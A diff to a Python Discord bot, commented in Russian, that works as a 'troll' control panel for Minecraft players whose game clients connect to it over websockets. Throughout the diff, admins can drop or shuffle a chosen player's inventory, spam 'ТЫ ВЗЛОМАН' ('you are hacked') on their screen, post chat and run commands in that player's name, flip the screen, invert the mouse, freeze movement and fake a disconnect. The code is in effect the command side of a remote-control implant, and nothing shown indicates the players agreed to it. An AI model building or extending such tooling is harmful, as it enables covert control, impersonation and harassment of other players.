@@ -1,7 +1,6 @@
 import os
 import asyncio
 import json
-import hashlib
 import discord
 from discord.ext import commands
 import websockets
@@ -41,8 +40,6 @@ def is_admin(user_id: int) -> bool:
 def is_protected(nick: str) -> bool:
     return nick.lower() in {n.lower() for n in config["protected_nicks"]}
 
-# ── Генерация картинки инвентаря ──────────────────────────────────────────────
-
 # ── Discord бот ───────────────────────────────────────────────────────────────
 
 intents = discord.Intents.default()
@@ -68,6 +65,86 @@ def make_embed(players: dict) -> discord.Embed:
     return embed
 
 
+# ── Модальные окна ────────────────────────────────────────────────────────────
+
+class DropModal(discord.ui.Modal, title="Выбросить предметы"):
+    slot = discord.ui.TextInput(label="Слот (0-35 или 'all')", default="all", max_length=10)
+    amount = discord.ui.TextInput(label="Количество (1-64 или 'all')", default="all", max_length=5)
+
+    async def on_submit(self, interaction: discord.Interaction):
+        player = getattr(bot, "selected_player", None)
+        if not player or player not in connected_players:
+            await interaction.response.send_message("❌ Игрок не выбран!", ephemeral=True); return
+        if is_protected(player):
+            await interaction.response.send_message(f"🛡️ `{player}` защищён!", ephemeral=True); return
+        slot_val = self.slot.value.strip().lower()
+        amount_val = self.amount.value.strip().lower()
+        if slot_val != "all":
+            try:
+                s = int(slot_val)
+                if not 0 <= s <= 35:
+                    await interaction.response.send_message("❌ Слот 0-35!", ephemeral=True); return
+            except ValueError:
+                await interaction.response.send_message("❌ Неверный слот!", ephemeral=True); return
+        if amount_val != "all":
+            try:
+                a = int(amount_val)
+                if not 1 <= a <= 64:
+                    await interaction.response.send_message("❌ Количество 1-64!", ephemeral=True); return
+            except ValueError:
+                await interaction.response.send_message("❌ Неверное количество!", ephemeral=True); return
+        await connected_players[player]["ws"].send(f"drop:{slot_val}:{amount_val}")
+        await interaction.response.send_message(f"✅ Выброс → `{player}` слот {slot_val} x{amount_val}", ephemeral=True)
+
+
+class SpamModal(discord.ui.Modal, title="Спам на экране"):
+    message = discord.ui.TextInput(label="Сообщение", default="ТЫ ВЗЛОМАН 😈", max_length=50)
+    count = discord.ui.TextInput(label="Повторений (1-30)", default="10", max_length=3)
+
+    async def on_submit(self, interaction: discord.Interaction):
+        player = getattr(bot, "selected_player", None)
+        if not player or player not in connected_players:
+            await interaction.response.send_message("❌ Игрок не выбран!", ephemeral=True); return
+        if is_protected(player):
+            await interaction.response.send_message(f"🛡️ `{player}` защищён!", ephemeral=True); return
+        try:
+            c = int(self.count.value.strip())
+            if not 1 <= c <= 30:
+                await interaction.response.send_message("❌ Повторений 1-30!", ephemeral=True); return
+        except ValueError:
+            await interaction.response.send_message("❌ Неверное число!", ephemeral=True); return
+        await connected_players[player]["ws"].send(f"spam:{self.message.value}:{c}")
+        await interaction.response.send_message(f"✅ Спам → `{player}` | `{self.message.value}` x{c}", ephemeral=True)
+
+
+class ChatModal(discord.ui.Modal, title="Написать в чат"):
+    message = discord.ui.TextInput(label="Сообщение (от имени игрока)", max_length=256)
+
+    async def on_submit(self, interaction: discord.Interaction):
+        player = getattr(bot, "selected_player", None)
+        if not player or player not in connected_players:
+            await interaction.response.send_message("❌ Игрок не выбран!", ephemeral=True); return
+        if is_protected(player):
+            await interaction.response.send_message(f"🛡️ `{player}` защищён!", ephemeral=True); return
+        await connected_players[player]["ws"].send(f"chat:{self.message.value}")
+        await interaction.response.send_message(f"✅ Чат → `{player}`: `{self.message.value}`", ephemeral=True)
+
+
+class CommandModal(discord.ui.Modal, title="Выполнить команду"):
+    command = discord.ui.TextInput(label="Команда (без /)", placeholder="tp ~ ~10 ~", max_length=256)
+
+    async def on_submit(self, interaction: discord.Interaction):
+        player = getattr(bot, "selected_player", None)
+        if not player or player not in connected_players:
+            await interaction.response.send_message("❌ Игрок не выбран!", ephemeral=True); return
+        if is_protected(player):
+            await interaction.response.send_message(f"🛡️ `{player}` защищён!", ephemeral=True); return
+        await connected_players[player]["ws"].send(f"cmd:{self.command.value}")
+        await interaction.response.send_message(f"✅ Команда → `{player}`: `/{self.command.value}`", ephemeral=True)
+
+
+# ── Select игрока ─────────────────────────────────────────────────────────────
+
 class PlayerSelect(discord.ui.Select):
     def __init__(self):
         players = list(connected_players.keys())
@@ -78,107 +155,68 @@ class PlayerSelect(discord.ui.Select):
 
     async def callback(self, interaction: discord.Interaction):
         if not is_admin(interaction.user.id):
-            await interaction.response.send_message("❌ У тебя нет доступа к панели!", delete_after=5)
-            return
+            await interaction.response.send_message("❌ У тебя нет доступа к панели!", ephemeral=True); return
         bot.selected_player = self.values[0]
         nick = self.values[0]
         if is_protected(nick):
-            await interaction.response.send_message(f"🛡️ `{nick}` защищён от троллинга!", delete_after=5)
+            await interaction.response.send_message(f"🛡️ `{nick}` защищён от троллинга!", ephemeral=True)
         else:
-            await interaction.response.send_message(f"✅ Выбран: `{nick}`", delete_after=5)
+            await interaction.response.send_message(f"✅ Выбран: `{nick}`", ephemeral=True)
 
 
-class DropModal(discord.ui.Modal, title="Выбросить предметы"):
-    slot = discord.ui.TextInput(label="Слот (0-35 или 'all')", default="all", max_length=10)
-    amount = discord.ui.TextInput(label="Количество (1-64 или 'all')", default="all", max_length=5)
+# ── Меню эффектов (открывается по кнопке "😈 Троллинг") ──────────────────────
 
-    async def on_submit(self, interaction: discord.Interaction):
+class TrollEffectsView(discord.ui.View):
+    """Отдельное меню с визуальными эффектами."""
+
+    def __init__(self):
+        super().__init__(timeout=60)
+
+    async def send_effect(self, interaction: discord.Interaction, cmd: str, label: str):
+        if not is_admin(interaction.user.id):
+            await interaction.response.send_message("❌ Нет доступа!", ephemeral=True); return
         player = getattr(bot, "selected_player", None)
         if not player or player not in connected_players:
-            await interaction.response.send_message("❌ Игрок не выбран!", delete_after=5)
-            return
+            await interaction.response.send_message("❌ Сначала выбери игрока в главной панели!", ephemeral=True); return
         if is_protected(player):
-            await interaction.response.send_message(f"🛡️ `{player}` защищён!", delete_after=5)
-            return
-        slot_val = self.slot.value.strip().lower()
-        amount_val = self.amount.value.strip().lower()
-        if slot_val != "all":
-            try:
-                s = int(slot_val)
-                if not 0 <= s <= 35:
-                    await interaction.response.send_message("❌ Слот 0-35!", delete_after=5)
-                    return
-            except ValueError:
-                await interaction.response.send_message("❌ Неверный слот!", delete_after=5)
-                return
-        if amount_val != "all":
-            try:
-                a = int(amount_val)
-                if not 1 <= a <= 64:
-                    await interaction.response.send_message("❌ Количество 1-64!", delete_after=5)
-                    return
-            except ValueError:
-                await interaction.response.send_message("❌ Неверное количество!", delete_after=5)
-                return
-        cmd = f"drop:{slot_val}:{amount_val}"
-        await connected_players[player]["ws"].send(cmd)
-        await interaction.response.send_message(f"✅ Выброс → `{player}` слот {slot_val} x{amount_val}", delete_after=5)
-
-
-class SpamModal(discord.ui.Modal, title="Спам на экране"):
-    message = discord.ui.TextInput(label="Сообщение", default="ТЫ ВЗЛОМАН 😈", max_length=50)
-    count = discord.ui.TextInput(label="Повторений (1-30)", default="10", max_length=3)
-
-    async def on_submit(self, interaction: discord.Interaction):
-        player = getattr(bot, "selected_player", None)
-        if not player or player not in connected_players:
-            await interaction.response.send_message("❌ Игрок не выбран!", delete_after=5)
-            return
-        if is_protected(player):
-            await interaction.response.send_message(f"🛡️ `{player}` защищён!", delete_after=5)
-            return
+            await interaction.response.send_message(f"🛡️ `{player}` защищён!", ephemeral=True); return
         try:
-            c = int(self.count.value.strip())
-            if not 1 <= c <= 30:
-                await interaction.response.send_message("❌ Повторений 1-30!", delete_after=5)
-                return
-        except ValueError:
-            await interaction.response.send_message("❌ Неверное число!", delete_after=5)
-            return
-        cmd = f"spam:{self.message.value}:{c}"
-        await connected_players[player]["ws"].send(cmd)
-        await interaction.response.send_message(f"✅ Спам → `{player}` | `{self.message.value}` x{c}", delete_after=5)
+            await connected_players[player]["ws"].send(cmd)
+            await interaction.response.send_message(f"✅ `{label}` → `{player}`", ephemeral=True)
+        except Exception as e:
+            await interaction.response.send_message(f"❌ Ошибка: {e}", ephemeral=True)
+
+    @discord.ui.button(label="🙃 Перевернуть экран", style=discord.ButtonStyle.danger, row=0)
+    async def flip(self, interaction, button):
+        await self.send_effect(interaction, "flip_screen", "Экран перевёрнут на 10с")
+
+    @discord.ui.button(label="🖱️ Инвертировать мышку", style=discord.ButtonStyle.danger, row=0)
+    async def invert_mouse(self, interaction, button):
+        await self.send_effect(interaction, "invert_mouse", "Мышка инвертирована на 20с")
+
+    @discord.ui.button(label="🔊 Воспроизвести звук", style=discord.ButtonStyle.primary, row=0)
+    async def play_sound(self, interaction, button):
+        await self.send_effect(interaction, "play_sound", "Звук воспроизведён")
+
+    @discord.ui.button(label="❄️ Заблокировать движение", style=discord.ButtonStyle.primary, row=1)
+    async def freeze(self, interaction, button):
+        await self.send_effect(interaction, "freeze", "Игрок заморожен на 5с")
+
+    @discord.ui.button(label="📳 Тряска экрана", style=discord.ButtonStyle.danger, row=1)
+    async def shake(self, interaction, button):
+        await self.send_effect(interaction, "shake", "Тряска экрана на 5с")
+
+    @discord.ui.button(label="◀️ Назад к панели", style=discord.ButtonStyle.secondary, row=2)
+    async def back(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not is_admin(interaction.user.id):
+            await interaction.response.send_message("❌ Нет доступа!", ephemeral=True); return
+        await interaction.response.send_message(
+            "↩️ Используй главную панель выше.",
+            ephemeral=True
+        )
 
 
-class ChatModal(discord.ui.Modal, title="Написать в чат"):
-    message = discord.ui.TextInput(label="Сообщение", max_length=256)
-
-    async def on_submit(self, interaction: discord.Interaction):
-        player = getattr(bot, "selected_player", None)
-        if not player or player not in connected_players:
-            await interaction.response.send_message("❌ Игрок не выбран!", delete_after=5)
-            return
-        if is_protected(player):
-            await interaction.response.send_message(f"🛡️ `{player}` защищён!", delete_after=5)
-            return
-        await connected_players[player]["ws"].send(f"chat:{self.message.value}")
-        await interaction.response.send_message(f"✅ Сообщение отправлено → `{player}`", delete_after=5)
-
-
-class CommandModal(discord.ui.Modal, title="Выполнить команду"):
-    command = discord.ui.TextInput(label="Команда (без /)", placeholder="gamemode creative", max_length=256)
-
-    async def on_submit(self, interaction: discord.Interaction):
-        player = getattr(bot, "selected_player", None)
-        if not player or player not in connected_players:
-            await interaction.response.send_message("❌ Игрок не выбран!", delete_after=5)
-            return
-        if is_protected(player):
-            await interaction.response.send_message(f"🛡️ `{player}` защищён!", delete_after=5)
-            return
-        await connected_players[player]["ws"].send(f"cmd:{self.command.value}")
-        await interaction.response.send_message(f"✅ Команда выполнена → `{player}`", delete_after=5)
-
+# ── Главная панель ────────────────────────────────────────────────────────────
 
 class TrollView(discord.ui.View):
     def __init__(self):
@@ -187,21 +225,19 @@ class TrollView(discord.ui.View):
 
     async def send_cmd(self, interaction: discord.Interaction, cmd: str, label: str):
         if not is_admin(interaction.user.id):
-            await interaction.response.send_message("❌ У тебя нет доступа!", delete_after=5)
-            return
+            await interaction.response.send_message("❌ У тебя нет доступа!", ephemeral=True); return
         player = getattr(bot, "selected_player", None)
         if not player or player not in connected_players:
-            await interaction.response.send_message("❌ Сначала выбери игрока!", delete_after=5)
-            return
+            await interaction.response.send_message("❌ Сначала выбери игрока!", ephemeral=True); return
         if is_protected(player):
-            await interaction.response.send_message(f"🛡️ `{player}` защищён от троллинга!", delete_after=5)
-            return
+            await interaction.response.send_message(f"🛡️ `{player}` защищён от троллинга!", ephemeral=True); return
         try:
             await connected_players[player]["ws"].send(cmd)
-            await interaction.response.send_message(f"✅ `{label}` → `{player}`", delete_after=5)
+            await interaction.response.send_message(f"✅ `{label}` → `{player}`", ephemeral=True)
         except Exception as e:
-            await interaction.response.send_message(f"❌ Ошибка: {e}", delete_after=5)
+            await interaction.response.send_message(f"❌ Ошибка: {e}", ephemeral=True)
 
+    # row=1
     @discord.ui.button(label="🔀 Перемешать инвентарь", style=discord.ButtonStyle.danger, row=1)
     async def shuffle(self, interaction, button):
         await self.send_cmd(interaction, "shuffle", "Инвентарь перемешан")
@@ -214,24 +250,24 @@ class TrollView(discord.ui.View):
     async def restore(self, interaction, button):
         await self.send_cmd(interaction, "restore", "Управление восстановлено")
 
+    # row=2
     @discord.ui.button(label="📦 Выбросить предметы...", style=discord.ButtonStyle.danger, row=2)
     async def drop(self, interaction, button):
         if not is_admin(interaction.user.id):
-            await interaction.response.send_message("❌ У тебя нет доступа!", delete_after=5)
-            return
+            await interaction.response.send_message("❌ Нет доступа!", ephemeral=True); return
         await interaction.response.send_modal(DropModal())
 
     @discord.ui.button(label="💬 Спам на экране...", style=discord.ButtonStyle.primary, row=2)
     async def spam(self, interaction, button):
         if not is_admin(interaction.user.id):
-            await interaction.response.send_message("❌ У тебя нет доступа!", delete_after=5)
-            return
+            await interaction.response.send_message("❌ Нет доступа!", ephemeral=True); return
         await interaction.response.send_modal(SpamModal())
 
     @discord.ui.button(label="📡 Фейк-дисконнект", style=discord.ButtonStyle.secondary, row=2)
     async def fakedisco(self, interaction, button):
         await self.send_cmd(interaction, "fakedisco", "Фейк-дисконнект")
 
+    # row=3
     @discord.ui.button(label="🍌 Бананчик", style=discord.ButtonStyle.danger, row=3)
     async def banana(self, interaction, button):
         await self.send_cmd(interaction, "banana", "Бананчик запущен")
@@ -240,44 +276,56 @@ class TrollView(discord.ui.View):
     async def extinguisher(self, interaction, button):
         await self.send_cmd(interaction, "extinguisher", "Огнетушитель!")
 
-    @discord.ui.button(label="💬 Написать в чат...", style=discord.ButtonStyle.primary, row=3)
+    @discord.ui.button(label="💬 Написать в чат...", style=discord.ButtonStyle.secondary, row=3)
     async def chat(self, interaction, button):
         if not is_admin(interaction.user.id):
-            await interaction.response.send_message("❌ У тебя нет доступа!", delete_after=5)
-            return
+            await interaction.response.send_message("❌ Нет доступа!", ephemeral=True); return
         player = getattr(bot, "selected_player", None)
         if not player or player not in connected_players:
-            await interaction.response.send_message("❌ Сначала выбери игрока!", delete_after=5)
-            return
+            await interaction.response.send_message("❌ Сначала выбери игрока!", ephemeral=True); return
         if is_protected(player):
-            await interaction.response.send_message(f"🛡️ `{player}` защищён!", delete_after=5)
-            return
+            await interaction.response.send_message(f"🛡️ `{player}` защищён!", ephemeral=True); return
         await interaction.response.send_modal(ChatModal())
 
     @discord.ui.button(label="⌨️ Выполнить команду...", style=discord.ButtonStyle.danger, row=3)
     async def command(self, interaction, button):
         if not is_admin(interaction.user.id):
-            await interaction.response.send_message("❌ У тебя нет доступа!", delete_after=5)
-            return
+            await interaction.response.send_message("❌ Нет доступа!", ephemeral=True); return
         player = getattr(bot, "selected_player", None)
         if not player or player not in connected_players:
-            await interaction.response.send_message("❌ Сначала выбери игрока!", delete_after=5)
-            return
+            await interaction.response.send_message("❌ Сначала выбери игрока!", ephemeral=True); return
         if is_protected(player):
-            await interaction.response.send_message(f"🛡️ `{player}` защищён!", delete_after=5)
-            return
+            await interaction.response.send_message(f"🛡️ `{player}` защищён!", ephemeral=True); return
         await interaction.response.send_modal(CommandModal())
+
+    # row=4
+    @discord.ui.button(label="😈 Троллинг", style=discord.ButtonStyle.danger, row=4)
+    async def troll_effects(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not is_admin(interaction.user.id):
+            await interaction.response.send_message("❌ Нет доступа!", ephemeral=True); return
+        player = getattr(bot, "selected_player", None)
+        if not player or player not in connected_players:
+            await interaction.response.send_message("❌ Сначала выбери игрока!", ephemeral=True); return
+        if is_protected(player):
+            await interaction.response.send_message(f"🛡️ `{player}` защищён!", ephemeral=True); return
+        embed = discord.Embed(
+            title=f"😈 Эффекты троллинга → {player}",
+            description="Выбери эффект:",
+            color=0x9B59B6
+        )
+        await interaction.response.send_message(embed=embed, view=TrollEffectsView(), ephemeral=True)
 
     @discord.ui.button(label="🔄 Обновить список", style=discord.ButtonStyle.success, row=4)
     async def refresh(self, interaction, button):
         if not is_admin(interaction.user.id):
-            await interaction.response.send_message("❌ У тебя нет доступа!", delete_after=5)
-            return
+            await interaction.response.send_message("❌ Нет доступа!", ephemeral=True); return
         await interaction.response.edit_message(
             embed=make_embed(connected_players),
             view=TrollView()
         )
 
+
+# ── WebSocket сервер ──────────────────────────────────────────────────────────
 
 async def update_panel():
     global troll_message
@@ -338,8 +386,7 @@ async def set_owner(ctx, discord_id: int):
     if config["owner_id"] is not None:
         if not is_owner(ctx.author.id):
             await ctx.message.delete()
-            await ctx.send("❌ Владелец уже задан.", delete_after=5)
-            return
+            await ctx.send("❌ Владелец уже задан.", delete_after=5); return
     config["owner_id"] = discord_id
     save_config()
     await ctx.message.delete()
@@ -350,8 +397,7 @@ async def set_owner(ctx, discord_id: int):
 async def add_id_admin(ctx, discord_id: int):
     await ctx.message.delete()
     if not is_owner(ctx.author.id):
-        await ctx.send("❌ Только владелец может добавлять админов.", delete_after=5)
-        return
+        await ctx.send("❌ Только владелец может добавлять админов.", delete_after=5); return
     config["admin_ids"].add(discord_id)
     save_config()
     await ctx.send(f"✅ Администратор `{discord_id}` добавлен.", delete_after=5)
@@ -361,8 +407,7 @@ async def add_id_admin(ctx, discord_id: int):
 async def remove_admin(ctx, discord_id: int):
     await ctx.message.delete()
     if not is_owner(ctx.author.id):
-        await ctx.send("❌ Только владелец может убирать админов.", delete_after=5)
-        return
+        await ctx.send("❌ Только владелец может убирать админов.", delete_after=5); return
     config["admin_ids"].discard(discord_id)
     save_config()
     await ctx.send(f"✅ Администратор `{discord_id}` удалён.", delete_after=5)
@@ -372,8 +417,7 @@ async def remove_admin(ctx, discord_id: int):
 async def add_notroll(ctx, mc_nick: str):
     await ctx.message.delete()
     if not is_admin(ctx.author.id):
-        await ctx.send("❌ Нет доступа.", delete_after=5)
-        return
+        await ctx.send("❌ Нет доступа.", delete_after=5); return
     config["protected_nicks"].add(mc_nick)
     save_config()
     await notify_player(mc_nick, True)
@@ -385,8 +429,7 @@ async def add_notroll(ctx, mc_nick: str):
 async def remove_notroll(ctx, mc_nick: str):
     await ctx.message.delete()
     if not is_admin(ctx.author.id):
-        await ctx.send("❌ Нет доступа.", delete_after=5)
-        return
+        await ctx.send("❌ Нет доступа.", delete_after=5); return
     config["protected_nicks"].discard(mc_nick)
     save_config()
     await notify_player(mc_nick, False)
@@ -398,8 +441,7 @@ async def remove_notroll(ctx, mc_nick: str):
 async def admin_list(ctx):
     await ctx.message.delete()
     if not is_owner(ctx.author.id):
-        await ctx.send("❌ Только владелец.", delete_after=5)
-        return
+        await ctx.send("❌ Только владелец.", delete_after=5); return
     lines = [f"👑 Владелец: `{config['owner_id']}`"]
     if config["admin_ids"]:
         lines.append("👮 Админы: " + ", ".join(f"`{i}`" for i in config["admin_ids"]))
